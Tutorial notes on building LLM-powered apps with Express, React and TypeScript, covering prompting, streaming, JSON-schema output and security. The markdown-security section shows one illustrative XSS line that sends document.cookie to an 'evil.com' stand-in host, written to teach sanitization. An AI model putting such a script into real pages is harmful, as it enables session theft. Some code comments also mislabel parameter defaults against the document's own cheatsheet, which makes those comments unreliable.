# 🤖 AI Integration — Complete Engineering Notes

> **Goal:** Understand how to integrate Large Language Models (LLMs) into real-world applications using Node.js, React, TypeScript, and REST APIs.
>
> **Stack Covered:** OpenAI API · Anthropic Claude API · Express.js · React · TypeScript · Streaming · Prompt Engineering

---

# Table of Contents

1. [How Language Models Work](#1-how-language-models-work)
2. [Tokens & Context Window](#2-tokens--context-window)
3. [Messages Array & Conversation History](#3-messages-array--conversation-history)
4. [API Setup & Project Structure](#4-api-setup--project-structure)
5. [Prompt Engineering](#5-prompt-engineering)
6. [Few-Shot Prompting](#6-few-shot-prompting)
7. [Temperature & Top-P](#7-temperature--top-p)
8. [Streaming AI Responses](#8-streaming-ai-responses)
9. [Structured Output (JSON Schema)](#9-structured-output-json-schema)
10. [Web Search Tool Integration](#10-web-search-tool-integration)
11. [Markdown Rendering & Security](#11-markdown-rendering--security)
12. [Security Best Practices](#12-security-best-practices)
13. [Quick Reference Cheatsheet](#13-quick-reference-cheatsheet)

---

# 1. How Language Models Work

## 📖 Definition

A **Language Model (LM)** is a machine learning system trained on massive text datasets. It learns statistical patterns between words/tokens and can predict the most likely next token given a sequence of previous tokens.

> Think of it like autocomplete — but trained on the entire internet, able to reason, summarize, translate, and generate code.

## ⚙️ Core Mechanics

| Concept       | Explanation                                                                                                            |
| ------------- | ---------------------------------------------------------------------------------------------------------------------- |
| **Token**     | The smallest unit the model processes. A token ≈ ¾ of a word (e.g., "running" → 1 token, "extraordinary" → 2-3 tokens) |
| **Training**  | Model learns to predict the next token by reading billions of text examples                                            |
| **Inference** | The process of generating a response from a given input prompt                                                         |
| **No Memory** | Each API call is stateless — the model has zero knowledge of prior calls                                               |

## 🧠 What LLMs Can Do

- **Text Generation** — Write essays, emails, stories, documentation
- **Text Completion** — Complete partial sentences or code
- **Summarization** — Condense long documents into short summaries
- **Question Answering** — Answer questions based on provided context
- **Translation** — Translate between languages
- **Sentiment Analysis** — Classify emotional tone of text
- **Code Generation** — Write, explain, and debug code
- **Data Extraction** — Pull structured data from unstructured text

## ❌ What LLMs Cannot Do (By Default)

- Access the internet or real-time data
- Remember previous conversations across API calls
- Execute code or interact with systems
- Store user data

> **Software Engineering Note:** These limitations shape almost every architectural decision when building AI-powered apps. You build systems _around_ these constraints.

---

# 2. Tokens & Context Window

## 📖 Definition

**Tokens** are the basic units of text that a model reads and writes. They are not always full words — they can be word pieces, punctuation, or characters.

```
"Hello, world!" → ["Hello", ",", " world", "!"] → 4 tokens
"TypeScript"    → ["Type", "Script"]              → 2 tokens
```

## 📦 Context Window

The **context window** is the maximum number of tokens the model can process in a single API call (input + output combined).

| Model             | Context Window |
| ----------------- | -------------- |
| GPT-4o            | 128,000 tokens |
| GPT-4o-mini       | 128,000 tokens |
| Claude 3.5 Sonnet | 200,000 tokens |
| Claude Haiku      | 200,000 tokens |

### Why It Matters

```
Total Context = Input Tokens + Output Tokens ≤ Max Context Window
```

If your prompt + conversation history exceeds the window:

- The model may truncate old messages
- The API may return an error
- Responses may become incomplete or inaccurate

## ✅ Best Practices

- Keep system prompts concise
- Summarize long conversation histories instead of sending everything
- Set `max_tokens` to limit output length and control costs
- Monitor token usage via `response.usage` in API responses

---

# 3. Messages Array & Conversation History

## 📖 Definition

The **messages array** is the data structure you send to the LLM API on every call. It contains the full conversation history — both user messages and assistant responses. This is how you simulate "memory" in a stateless system.

## 🔑 Message Roles

| Role        | Purpose                                                                         |
| ----------- | ------------------------------------------------------------------------------- |
| `system`    | Invisible instructions that set the AI's personality, constraints, and behavior |
| `user`      | Input from the human (or your app acting as human)                              |
| `assistant` | Prior responses from the AI model                                               |

## 💻 Code Example (TypeScript)

```typescript
interface Message {
  role: "system" | "user" | "assistant";
  content: string;
}

const messages: Message[] = [
  {
    role: "system",
    content: "You are a helpful coding assistant. Be concise and precise.",
  },
  {
    role: "user",
    content: "What is a closure in JavaScript?",
  },
  {
    role: "assistant",
    content:
      "A closure is a function that retains access to its outer scope even after the outer function has returned...",
  },
  {
    role: "user",
    content: "Can you give me a code example?", // ← New user message
  },
];
```

> The model sees this entire array and generates the next assistant message. Without including prior history, it has no idea what was discussed before.

## ⚙️ How the Model Evaluates It

```
Given this conversation history (messages array),
what is the most appropriate response to the latest user message,
given the full context of the conversation?
```

## 🔄 Maintaining State in a React App (TypeScript)

```typescript
const [messages, setMessages] = useState<Message[]>([
  { role: "system", content: "You are a helpful assistant." },
]);

const sendMessage = async (userInput: string) => {
  const newMessages: Message[] = [
    ...messages,
    { role: "user", content: userInput },
  ];

  setMessages(newMessages); // optimistically update UI

  const response = await fetch("/api/chat", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ messages: newMessages }),
  });

  const data = await response.json();
  const assistantMessage: Message = {
    role: "assistant",
    content: data.content,
  };

  setMessages([...newMessages, assistantMessage]);
};
```

---

# 4. API Setup & Project Structure

## 🚀 Initial Setup

```bash
# Initialize a Node.js project
npm init -y

# Core dependencies
npm install express cors dotenv openai

# Development tools
npm install --save-dev nodemon typescript @types/express @types/node ts-node
```

## 📁 Recommended Project Structure

```
ai-app/
├── src/
│   ├── index.ts          # Express server entry point
│   ├── routes/
│   │   └── chat.ts       # Chat API route
│   ├── services/
│   │   └── openai.ts     # AI client wrapper
│   └── types/
│       └── index.ts      # Shared TypeScript types
├── .env                  # Environment variables (never commit!)
├── .env.example          # Template for teammates
├── .gitignore
├── tsconfig.json
└── package.json
```

## 🔐 Environment Variables (`.env`)

```env
# OpenAI
OPENAI_API_KEY=sk-...
OPENAI_BASE_URL=https://api.openai.com/v1
OPENAI_MODEL=gpt-4o-mini

# Anthropic
ANTHROPIC_API_KEY=sk-ant-...

# Server
PORT=3000
```

## 🖥️ Express Server (`src/index.ts`)

```typescript
import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import chatRouter from "./routes/chat";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

app.use("/api/chat", chatRouter);

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```

## 📦 `package.json` Scripts

```json
{
  "scripts": {
    "dev": "nodemon --exec ts-node src/index.ts",
    "build": "tsc",
    "start": "node dist/index.js"
  }
}
```

## 🔌 OpenAI Client Wrapper (`src/services/openai.ts`)

```typescript
import OpenAI from "openai";

const client = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY,
  baseURL: process.env.OPENAI_BASE_URL,
});

export default client;
```

---

# 5. Prompt Engineering

## 📖 Definition

**Prompt Engineering** is the practice of crafting input instructions (prompts) to guide an LLM toward producing accurate, relevant, and well-structured outputs.

> The quality of your prompt directly determines the quality of the AI's output. Garbage in → garbage out.

## 🧩 Anatomy of a Great Prompt

```
[ROLE]       → Who is the AI? What persona should it take?
[CONTEXT]    → What background information does it need?
[TASK]       → What exactly should it do?
[FORMAT]     → What should the output look like?
[CONSTRAINTS]→ What should it avoid?
```

## ✏️ System Prompt Examples

### Bad System Prompt

```
You are a helpful assistant.
```

### Good System Prompt (TypeScript)

```typescript
const systemPrompt = `
You are a senior TypeScript engineer at a startup.
Your job is to review code, suggest improvements, and explain concepts clearly.

Rules:
- Always provide working TypeScript code examples
- Explain WHY, not just WHAT
- If unsure, say so — never make things up
- Format code in markdown code blocks with the language specified
- Keep responses under 300 words unless the user asks for detail
`;
```

## 📋 Prompt Engineering Techniques

### 1. Be Specific & Explicit

```typescript
// ❌ Vague
"Explain React hooks.";

// ✅ Specific
"Explain the useEffect hook in React. Include: (1) its purpose, (2) the dependency array, (3) cleanup functions. Provide a TypeScript code example for each.";
```

### 2. Use Positive Instructions (not negative)

```typescript
// ❌ Negative framing
"Don't give me a long response.";

// ✅ Positive framing
"Respond in 3 bullet points maximum.";
```

### 3. Specify Output Format

```typescript
"Respond ONLY with a valid JSON object. No explanation, no markdown, no backticks.
Format: { name: string, age: number, skills: string[] }"
```

### 4. Chain-of-Thought (CoT) Prompting

```typescript
"Before answering, think step by step:
1. Identify what the user is asking
2. Break the problem into parts
3. Solve each part
4. Combine into a final answer

User question: Why is my React component re-rendering infinitely?"
```

## ⚠️ max_tokens Considerations

```typescript
// Setting max_tokens too low causes:
// - Truncated/incomplete responses
// - finish_reason: "length" instead of "stop"
// - Empty or partial JSON in structured outputs

const response = await client.chat.completions.create({
  model: "gpt-4o-mini",
  max_tokens: 500, // Balance between cost and completeness
  messages: messages,
});

// Always check finish reason
if (response.choices[0].finish_reason === "length") {
  console.warn("Response was truncated! Increase max_tokens.");
}
```

---

# 6. Few-Shot Prompting

## 📖 Definition

**Few-Shot Prompting** (also called multi-shot or example-based prompting) is a technique where you include 2–5 worked examples in the prompt to show the model exactly what format or behavior you expect. The model learns the pattern from your examples and applies it to the new input.

> Zero-shot: No examples given  
> One-shot: 1 example given  
> Few-shot: 2–5 examples given

## 🎯 Use Cases

- Enforcing a specific JSON structure
- Generating data in a custom format
- Classification tasks
- Tone/style consistency across responses

## 💻 Code Example (TypeScript)

```typescript
const messages: Message[] = [
  {
    role: "system",
    content: "You classify customer support tickets into categories.",
  },
  // --- Examples (few-shots) ---
  {
    role: "user",
    content: "My payment failed three times.",
  },
  {
    role: "assistant",
    content: JSON.stringify({ category: "billing", priority: "high" }),
  },
  {
    role: "user",
    content: "How do I reset my password?",
  },
  {
    role: "assistant",
    content: JSON.stringify({ category: "account", priority: "low" }),
  },
  {
    role: "user",
    content: "The app crashes every time I open it.",
  },
  {
    role: "assistant",
    content: JSON.stringify({ category: "bug", priority: "critical" }),
  },
  // --- Real input ---
  {
    role: "user",
    content: "I was charged twice for the same order.",
  },
];
```

## ⚖️ Trade-offs

| Benefit                          | Cost                          |
| -------------------------------- | ----------------------------- |
| More accurate/consistent outputs | Uses more input tokens        |
| Enforces specific formats        | Slightly higher latency       |
| Reduces hallucinations           | Increased API cost            |
| Great for classification         | Can hit context window limits |

> **Rule of Thumb:** Start with 2–3 examples. Add more only if accuracy is insufficient. Always monitor token usage.

---

# 7. Temperature & Top-P

## 📖 Temperature

**Temperature** controls how **random** or **creative** the model's token selection is. It scales the probability distribution over possible next tokens.

```
Low Temperature (0.1–0.3)  → Predictable, focused, deterministic
High Temperature (0.7–1.0) → Creative, diverse, unpredictable
```

### Mental Model

Think of temperature as a "confidence dial":

- **Low temp:** Model always picks the most likely next word → safe and repetitive
- **High temp:** Model sometimes picks surprising words → creative and varied

```
Prompt: "The capital of France is ___"

Temp 0.1 → "Paris" (every time)
Temp 1.5 → "Paris" / "Lyon" / "known for its..." (unpredictably varied)
```

### Use Case Guide

| Temperature | Use Case                                     |
| ----------- | -------------------------------------------- |
| `0.0 – 0.2` | Factual Q&A, data extraction, classification |
| `0.3 – 0.5` | Code generation, technical writing           |
| `0.6 – 0.8` | Conversational chatbots, summaries           |
| `0.8 – 1.0` | Creative writing, brainstorming, poetry      |

## 📖 Top-P (Nucleus Sampling)

**Top-P** limits the pool of tokens the model can choose from to only those whose **cumulative probability** exceeds the `top_p` value.

```
top_p = 1.0 → All tokens considered (default, maximum diversity)
top_p = 0.9 → Only top 90% probability mass considered
top_p = 0.5 → Only top 50% probability mass (very focused)
```

> Think of it as: "Only consider the most obvious choices, not wild outliers."

## 💻 Usage in Code

```typescript
const response = await client.chat.completions.create({
  model: process.env.OPENAI_MODEL!,
  messages: messages,
  temperature: 0.7, // Default: balanced creativity
  top_p: 0.9, // Default: slight focus
  max_tokens: 500,
});
```

## ⚠️ Critical Engineering Rule

> **Do not tune both temperature AND top-p simultaneously.**  
> They both control randomness — adjusting both creates unpredictable compounding effects.  
> Tune one, leave the other at default. In most production apps, you'll set these once during development and never touch them again.

---

# 8. Streaming AI Responses

## 📖 Definition

**Streaming** means receiving the AI's response **token by token** as it's generated, instead of waiting for the complete response. This dramatically improves perceived performance.

## 🧠 Why Streaming Matters

```
Without streaming:
User sends message → [3-10 second wait] → Full response appears

With streaming:
User sends message → [~100ms] → Response starts appearing character by character
```

The model generates text token-by-token internally. Streaming exposes this natural process to the user, making the UI feel instant and alive.

## 🔧 Server-Side: Server-Sent Events (SSE) with Express

```typescript
// src/routes/chat.ts
import { Router, Request, Response } from "express";
import OpenAI from "openai";

const router = Router();
const client = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });

router.post("/stream", async (req: Request, res: Response) => {
  const { messages } = req.body;

  // Set SSE headers
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");

  try {
    const stream = await client.chat.completions.create({
      model: "gpt-4o-mini",
      messages,
      stream: true, // ← Enable streaming
    });

    // 'for await...of' is required — normal for loops don't work with async iterables
    for await (const chunk of stream) {
      const content = chunk.choices[0]?.delta?.content;

      if (content) {
        // Send chunk to client as SSE
        res.write(`data: ${JSON.stringify({ content })}\n\n`);
      }

      // Check if stream is done
      if (chunk.choices[0]?.finish_reason === "stop") {
        res.write("data: [DONE]\n\n");
        res.end();
      }
    }
  } catch (error) {
    res.write(`data: ${JSON.stringify({ error: "Stream failed" })}\n\n`);
    res.end();
  }
});

export default router;
```

## 🖥️ Client-Side: React + TypeScript

```typescript
// Streaming hook
const useStreamingChat = () => {
  const [response, setResponse] = useState("");
  const [isStreaming, setIsStreaming] = useState(false);

  const sendMessage = async (messages: Message[]) => {
    setIsStreaming(true);
    setResponse(""); // Clear previous response

    const res = await fetch("/api/chat/stream", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ messages }),
    });

    const reader = res.body!.getReader();
    const decoder = new TextDecoder();

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      const text = decoder.decode(value);
      const lines = text.split("\n").filter((line) => line.startsWith("data:"));

      for (const line of lines) {
        const data = line.replace("data: ", "").trim();
        if (data === "[DONE]") {
          setIsStreaming(false);
          return;
        }

        try {
          const parsed = JSON.parse(data);
          // Append each chunk to build the full response
          setResponse((prev) => prev + (parsed.content || ""));
        } catch {
          // Skip malformed chunks
        }
      }
    }

    setIsStreaming(false);
  };

  return { response, isStreaming, sendMessage };
};
```

## 🔑 Key Concept: `for await...of`

Regular `for` loops cannot iterate over streams because streams deliver data **asynchronously over time** — there's no complete array to loop over yet.

```typescript
// ❌ WRONG — Regular for loop can't handle async iterables
for (const chunk of stream) { ... }

// ✅ CORRECT — Async iterator processes chunks as they arrive
for await (const chunk of stream) { ... }
```

> `for await...of` pauses at each iteration and waits for the next value to arrive asynchronously — perfect for AI streams, WebSocket messages, and file reads.

---

# 9. Structured Output (JSON Schema)

## 📖 Definition

**Structured Output** forces the model to respond with valid, schema-compliant JSON instead of free-form text. This is essential when your application needs to parse and display AI-generated data programmatically.

## 🎯 Use Cases

- Gift/product recommendation cards
- Search results with structured metadata
- Data extraction from text
- Form autofill
- API response generation

## 💻 Defining a JSON Schema (TypeScript)

```typescript
// TypeScript type definition
interface Gift {
  name: string;
  price_range: string;
  why_its_good: string;
}

interface GiftResponse {
  gifts: Gift[];
}

// JSON Schema for the API
const giftSchema = {
  type: "json_schema" as const,
  json_schema: {
    name: "gift_suggestions",
    schema: {
      type: "object",
      properties: {
        gifts: {
          type: "array",
          items: {
            type: "object",
            additionalProperties: false,
            properties: {
              name: { type: "string" },
              price_range: { type: "string" },
              why_its_good: { type: "string" },
            },
            required: ["name", "price_range", "why_its_good"],
          },
        },
      },
      required: ["gifts"],
      additionalProperties: false,
    },
    strict: true,
  },
};
```

## 💻 Chat Completions API with Structured Output

```typescript
const response = await client.chat.completions.create({
  model: "gpt-4o-mini",
  messages: [
    {
      role: "system",
      content:
        "You are a gift advisor. Always respond with gift suggestions in the specified JSON format.",
    },
    {
      role: "user",
      content: "Suggest 3 birthday gifts for a developer who loves coffee.",
    },
  ],
  response_format: giftSchema,
  temperature: 0.7,
  max_tokens: 1000,
});

// Safe parsing
const rawText = response.choices[0].message.content;

try {
  const gifts: GiftResponse = JSON.parse(rawText!);
  console.log(gifts.gifts); // Fully typed, structured data
} catch (error) {
  console.error("Failed to parse structured response:", error);
}
```

## 💻 Responses API with Structured Output

```typescript
const response = await client.responses.create({
  model: "gpt-4o-mini",
  input: [
    { role: "system", content: "You are a gift advisor." },
    { role: "user", content: "Suggest 3 gifts for a developer." },
  ],
  text: {
    format: {
      type: "json_schema",
      name: "gift_suggestions",
      schema: {
        type: "object",
        additionalProperties: false,
        properties: {
          gifts: {
            type: "array",
            items: {
              type: "object",
              additionalProperties: false,
              properties: {
                name: { type: "string" },
                price_range: { type: "string" },
                why_its_good: { type: "string" },
              },
              required: ["name", "price_range", "why_its_good"],
            },
          },
        },
        required: ["gifts"],
      },
    },
  },
});

// Access via output_text
const gifts: GiftResponse = JSON.parse(response.output_text);
```

## ⚠️ Error Handling for JSON Responses

````typescript
const safeParseJSON = <T>(text: string): T | null => {
  try {
    // Strip markdown code fences if present (e.g., ```json ... ```)
    const cleaned = text.replace(/```json|```/g, "").trim();
    return JSON.parse(cleaned) as T;
  } catch (error) {
    console.error("JSON parse error:", error);
    return null;
  }
};
````

> **Important:** Different AI providers return different JSON structures. Always refer to provider-specific docs and test thoroughly when switching models.

---

# 10. Web Search Tool Integration

## 📖 Definition

LLMs have a **training cutoff date** and **no internet access by default**. The **Web Search Tool** is a built-in capability (available via the OpenAI Responses API) that allows the model to search the internet before generating a response.

## 🔧 How It Works (Architecturally)

```
User Query
    ↓
Model decides: "Do I need current info?"
    ↓ (if yes)
Model calls web_search tool internally
    ↓
Search results returned to model
    ↓
Model generates response using real-time data
    ↓
Final response to user
```

## 💻 OpenAI Responses API with Web Search

```typescript
const response = await client.responses.create({
  model: "gpt-4o-mini",
  input: [
    {
      role: "user",
      content: "What are the latest developments in AI this week?",
    },
  ],
  tools: [
    {
      type: "web_search_preview", // Enable web search
    },
  ],
  temperature: 0.5,
});

console.log(response.output_text);
```

## 🔧 Custom Web Search (When Using External APIs)

For providers that don't have built-in search, you implement it yourself:

```typescript
// 1. Search for data using a search API (e.g., Serper, Tavily, Brave)
const searchResults = await searchAPI.search(userQuery);

// 2. Inject search results into the prompt as context
const messages: Message[] = [
  {
    role: "system",
    content: "You answer questions using the provided search results.",
  },
  {
    role: "user",
    content: `
      Search Results:
      ${searchResults.map((r) => `- ${r.title}: ${r.snippet}`).join("\n")}
      
      Question: ${userQuery}
    `,
  },
];

// 3. Call the LLM with enriched context
const response = await client.chat.completions.create({
  model: "gpt-4o-mini",
  messages,
});
```

---

# 11. Markdown Rendering & Security

## 📖 Definition

LLMs commonly return responses formatted in **Markdown** (headings, bold, bullet points, code blocks). To display this properly in a React app, you must parse and render it as HTML.

## 🖥️ React + TypeScript Setup

```bash
npm install marked dompurify
npm install --save-dev @types/dompurify @types/marked
```

## 💻 Safe Markdown Renderer Component

```typescript
import { marked } from "marked";
import DOMPurify from "dompurify";
import { useMemo } from "react";

interface MarkdownRendererProps {
  content: string;
}

const MarkdownRenderer: React.FC<MarkdownRendererProps> = ({ content }) => {
  const sanitizedHTML = useMemo(() => {
    // Step 1: Parse markdown → raw HTML
    const rawHTML = marked(content) as string;

    // Step 2: Sanitize HTML to prevent XSS attacks
    return DOMPurify.sanitize(rawHTML, {
      ALLOWED_TAGS: ["p", "strong", "em", "ul", "ol", "li", "code", "pre", "h1", "h2", "h3", "a", "blockquote"],
      ALLOWED_ATTR: ["href", "target", "rel"],
    });
  }, [content]);

  return (
    <div
      className="prose prose-sm"
      dangerouslySetInnerHTML={{ __html: sanitizedHTML }}
    />
  );
};

export default MarkdownRenderer;
```

## 🔒 Why Sanitization is Critical

```
Without sanitization, a malicious AI response could contain:

<script>document.cookie → "https://evil.com/steal?data=" + document.cookie</script>

DOMPurify strips dangerous tags/attributes before they reach the DOM.
```

> **XSS (Cross-Site Scripting)** is a top-10 web vulnerability. Always sanitize any HTML you inject via `dangerouslySetInnerHTML`. Never trust AI output as safe HTML directly.

---

# 12. Security Best Practices

## 🔐 API Key Security

```
❌ NEVER do this:
- Hardcode API keys in source files
- Commit .env files to git
- Expose API keys in client-side (browser) code
- Log API keys in console output

✅ ALWAYS do this:
- Store keys in .env files
- Add .env to .gitignore
- Use server-side proxy to make all AI API calls
- Rotate keys if accidentally exposed
- Use environment variables in CI/CD (GitHub Actions, Vercel, etc.)
```

## 📋 `.gitignore` Template

```gitignore
# Environment variables
.env
.env.local
.env.production

# Node
node_modules/
dist/

# Logs
*.log
```

## 🏗️ Architecture: Never Call AI APIs from the Frontend

```
❌ WRONG Architecture:
Browser → OpenAI API directly (exposes your API key!)

✅ CORRECT Architecture:
Browser → Your Backend Server → OpenAI API
              ↑
        (API key lives here,
         hidden from users)
```

## 🛡️ Input Validation & Rate Limiting

```typescript
import rateLimit from "express-rate-limit";

// Prevent API abuse and cost overruns
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Max 100 requests per window
  message: "Too many requests, please try again later.",
});

app.use("/api/chat", limiter);

// Always validate and sanitize user input
const validateInput = (input: string): string => {
  if (!input || typeof input !== "string") throw new Error("Invalid input");
  if (input.length > 4000) throw new Error("Input too long");
  return input.trim();
};
```

---

# 13. Quick Reference Cheatsheet

## API Parameters Summary

| Parameter         | Type    | Default | Purpose                                  |
| ----------------- | ------- | ------- | ---------------------------------------- |
| `model`           | string  | —       | Which model to use                       |
| `messages`        | array   | —       | Conversation history (required)          |
| `temperature`     | float   | 1.0     | Creativity (0 = deterministic, 2 = wild) |
| `top_p`           | float   | 1.0     | Token diversity (lower = more focused)   |
| `max_tokens`      | int     | varies  | Max output length                        |
| `stream`          | boolean | false   | Enable streaming responses               |
| `response_format` | object  | —       | Force JSON schema output                 |

## Key Concepts Map

```
AI Integration
├── Input
│   ├── Messages Array (system, user, assistant roles)
│   ├── System Prompt (personality + constraints)
│   └── Few-Shot Examples (format training)
│
├── Model Config
│   ├── Temperature (creativity)
│   ├── Top-P (token diversity)
│   └── Max Tokens (output length)
│
├── Output
│   ├── Regular (wait for full response)
│   ├── Streaming (token-by-token via SSE)
│   └── Structured (JSON Schema enforced)
│
├── Augmentation
│   ├── Web Search (real-time data)
│   └── Context Injection (RAG pattern)
│
└── Security
    ├── API Key in .env (server-side only)
    ├── Input Validation
    ├── Rate Limiting
    └── Output Sanitization (XSS prevention)
```

## Decision Guide: Which Technique To Use?

| Scenario                                | Technique                        |
| --------------------------------------- | -------------------------------- |
| Need consistent, specific output format | Few-shot prompting + JSON schema |
| Building a chatbot with memory          | Messages array with full history |
| Need real-time internet data            | Web search tool                  |
| Improve UX on slow responses            | Streaming (SSE or WebSocket)     |
| Factual/precise answers needed          | Lower temperature (0.1–0.3)      |
| Creative writing / brainstorming        | Higher temperature (0.7–1.0)     |
| Displaying AI responses in UI           | Markdown parser + DOMPurify      |
| Controlling AI personality/behavior     | System prompt engineering        |

---

> 📌 **Final Note:** AI integration is more about **system design** than AI itself. Focus on: how you manage state (messages array), how you secure the pipeline (server-side proxy), and how you handle edge cases (stream failures, JSON parse errors, token limits). The AI model is just one piece of the puzzle.

---
